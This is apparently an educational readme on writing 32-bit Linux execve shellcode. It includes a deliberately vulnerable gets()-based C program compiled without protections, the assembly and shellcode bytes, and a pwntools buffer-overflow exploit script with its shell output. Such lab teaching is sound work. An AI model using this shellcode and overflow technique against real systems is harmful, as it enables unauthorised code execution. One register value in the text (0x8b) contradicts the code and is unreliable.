# Writing shellcode for x86 linux

This is a quick guide on how shellcode works for 32 bit linux systems. The shellcode here is to get a shell.

#### Target

the code for the target is here:
```
$	cat vuln.c 
#include <stdio.h>

void vuln(void)
{
	// Declare the buffer
        char vulnBuf[100];

        // Print the address of the buffer
        printf("%p\n", &vulnBuf);

        // Here is the vulnerabillity
        // It allows us to scan in as much data as
        // we want into the 100 byte vulnBuf buffer
        gets(vulnBuf);

        return;
}

int main(void)
{
	// Call the vulnerable function
        vuln();
}
```

We can see here that the vulnerabillity is a call to the `gets` function. Thing is, `gets` allows us to scan in as much data as we want into the 100 byte char array `vulnBuf`. It also prints the address of the buffer, so we know where our input is stored in memory. With this, we will just have a buffer overflow exploit that overwrites the return address to the start of `vulnBuf`, which will hold our shellcode.

We can compile the vulnerable target with this:
```
$	gcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack
```

You can check to ensure it's architecture is 32 bit with the `file` command, and that the stack canary is disabled, along with the stack being executable with pwn tools:
```
$	pwn checksec vuln
[*] '/Hackery/shellcode/x86_shellcode/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$	file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd75f1cb002cf439dc79bed41112471a574da9c6, not stripped
```

#### Writing Shellcode

The goal of the shellcode here, is to make an `execve` call, which will give us a shell (execve executes a binary). With it, we will execute the binary `/bin/sh` which will give us a shell. We will do this using an interrupt, specifically `int 0x80`. An interrupt essentially grants control of the program to something else. The code `0x80` specifies that the kernel is what will get control. We will need to specify that it is an `execve` call, with the code `0xb`. An `execve` call takes three arguments, the first being the string of the file path for the binary, the second being a list of arguments passed to the binary, and the third being a list of enviornment variables passed to the binary. 

For the first argument, we will need it to be a pointer to the string to the binary we are running (`/bin/sh`). For the second argument, we will have to pass it a ptr to an array, which at the front of it has a ptr to `/bin/sh`, and at the end has a null value. This is because in typical C fashion argv[0] is the name of the binary, and the end has to be a null value. For the enviornment variables, we don't need to worry about passing it anything specific to just get a shell (unless if there is something target specific that would make you have to worry abut it), so we can just pass it a null value for it 

The arguments for this type of interrupt are passed through the following registers, in the order from top to botto. Not all of the registers are used by an `execve` call:

```
eax:	holds the code for the specific operation requested from the kernel (0xb for execve)
ebx:	holds the string to the binary being run `/bin/sh`
ecx:	holds a ptr to the array of arguments passed to the binary, we will have it be a ptr to '/bin/sh' followed by 0 (which is NULL)
edx:	holds a ptr to the enviornment variables which are passed to the binary, we have it be 0 (which is NULL)
esi:	argument not used by execve
edi:	argument not used by execve
ebp:	argument not used by execve
```

now here is the shellcode which will give us a shell:
```
	push 0x0068732f
	push 0x6e69622f
	mov ebx, esp
	xor edx, edx
	push ebx
	push edx
	mov ecx, esp
	mov eax, 0xb
	int 0x80
```

now we will go line by line, explanning what everything does, starting with the first two push statements:

```
	push 0x0068732f
	push 0x6e69622f
```

These first two push statements will push the string `/bin/sh` onto the stack. It may look a little weird since it is in hex, and is in least endian (least significant byte first) because that is how this architecture reads data, however we can see here the mapping of byte to character:
```
0x00:	Null byte (used to null terminate the string)
0x68:	h
0x73:	s
0x2f:	/
0x6e:	n
0x69:	i
0x62:	b
0x2f:	/
```

Now the string `/bin/sh` is on the top of the stack. The `esp` register holds a pointer to the top of the stack, so right now it holds a pointer to the string `/bin/sh`. So we will just move the contents of the `esp` register into the `ebx` register to satisfy the first argument for the `execve` call:

```
	mov ebx, esp
```

Now the third argument for the `execve` call (stored in the `edx` register) which points to an array of enviornment variables, we will need it to be null since at the moment we don't have any need for enviornment variables. So we will xor the `edx` register by itself, since anything xored by itself is zero. This will zero out the `edx` register, and prep the third argument:

```
	xor edx, edx
```

Now we need to prep the second argument, which holds a pointer to the array of arguments which will be passed to the binary. We will need the array to first have a ptr to the string `/bin/sh`, which is then followed by a NULL value (which is just 0). A pointer to the string is stored in the `ebx` register, and the `edx` register holds the value 0, we can just push those two values onto the stack to make the array.

```
	push ebx
	push edx
```

Now just like with the first argument, the `esp` register (which points to the top of the stack) holds a pointer to the array we need. So we can just move the value of the `esp` register into the `ecx` register (which holds the second argument for the `execve` call).

```
	mov ecx, esp
```

Lastly we just need to move the value which specifies what operation we want for the kernel, wich is `0xb` for `execve`, into the `eax` register, which specifies what operation we want. 

```
	mov eax, 0xb
```

after that, the registers hold the following arguments:

```
eax:	0x8b
ebx:	ptr to '/bin/sh'
ecx:	holds a ptr to an array, with a ptr to '/bin/sh' in front, and ends with 0
edx:	just has NULL (0)
```

with all of the arguments prepped, we can trigger the interrupt with the argument `0x80`, so the kernel can take control:

```
	int 0x80
```

with that, we get the shell.

#### Compiling Shellcode

First you write the shellcode. Here is what my shellcode looks like:
```
$	cat shellcode.asm 
[SECTION .text]
global _start
_start:
	push 0x0068732f
	push 0x6e69622f
	mov ebx, esp
	xor edx, edx
	push ebx
	push edx
	mov ecx, esp
	mov eax, 0xb
	int 0x80
```

Proceeding that, we compile it as a 32 bit binary:

```
nasm -f elf32 shellcode.asm
```

Following that, we juts link the binary as a `32` bit binary:

```
ld -m elf_i386 -o shellcode shellcode.o
```

after that, we will be able to see the assembly code for the binary:

```
$	objdump -D shellcode -M intel

shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	68 2f 73 68 00       	push   0x68732f
 8048065:	68 2f 62 69 6e       	push   0x6e69622f
 804806a:	89 e3                	mov    ebx,esp
 804806c:	31 d2                	xor    edx,edx
 804806e:	53                   	push   ebx
 804806f:	52                   	push   edx
 8048070:	89 e1                	mov    ecx,esp
 8048072:	b8 0b 00 00 00       	mov    eax,0xb
 8048077:	cd 80                	int    0x80
```

We can see that the shellcode is `\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x53\x52\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80`. We can test the shellocde by running the binary we just compiled:

```
$	./shellcode 
$ w
 17:50:31 up  4:45,  1 user,  load average: 2.60, 2.55, 2.28
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guy      tty7     :0               13:07    4:45m  7:23   0.26s /sbin/upstart -
$ ls
peda-session-ls.txt	    readme.md  shellcode.asm  vuln
peda-session-shellcode.txt  shellcode  shellcode.o    vuln.c
$ exit
```

and we can test the exploit:
```
$	cat exploit.py 
# Import pwn tools
from pwn import *

# Establish the target process, and attach gdb
target = process('vuln')
#gdb.attach(target')

# Get the address being leaked, strip the newline, and convert it to and integer
infoleak = target.recvline().replace("\x0a", "")
address = int(infoleak, 16) 

# Establish the shellcode:
'''
 8048060:   68 2f 73 68 00          push   0x68732f
 8048065:   68 2f 62 69 6e          push   0x6e69622f
 804806a:   89 e3                   mov    ebx,esp
 804806c:   31 d2                   xor    edx,edx
 804806e:   53                      push   ebx
 804806f:   52                      push   edx
 8048070:   89 e1                   mov    ecx,esp
 8048072:   b8 0b 00 00 00          mov    eax,0xb
 8048077:   cd 80                   int    0x80
'''

shellcode = "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x53\x52\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

# Construct the payload
payload = shellcode + ((0x70 - len(shellcode))*"0") + p32(address)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell
$	python exploit.py 
[!] Could not find executable 'vuln' in $PATH, using './vuln' instead
[+] Starting local process './vuln': pid 9419
[*] Switching to interactive mode
$ ls
exploit.py            peda-session-vuln.txt  shellcode.asm  vuln.c
peda-session-ls.txt        readme.md           shellcode.o
peda-session-shellcode.txt  shellcode           vuln
$ w
 18:05:48 up  5:00,  1 user,  load average: 2.68, 2.18, 2.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guy      tty7     :0               13:07    5:00m  8:17   0.27s /sbin/upstart --user
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Process './vuln' stopped with exit code 0 (pid 9419)
```

#### Extra

For the list of what codes correspond with what operations you can request from the kernel from the `int 0x80` instruction, you can see the list here:
```
$	cat /usr/include/asm/unistd_32.h | grep execve
#define __NR_execve 11
#define __NR_execveat 358
```
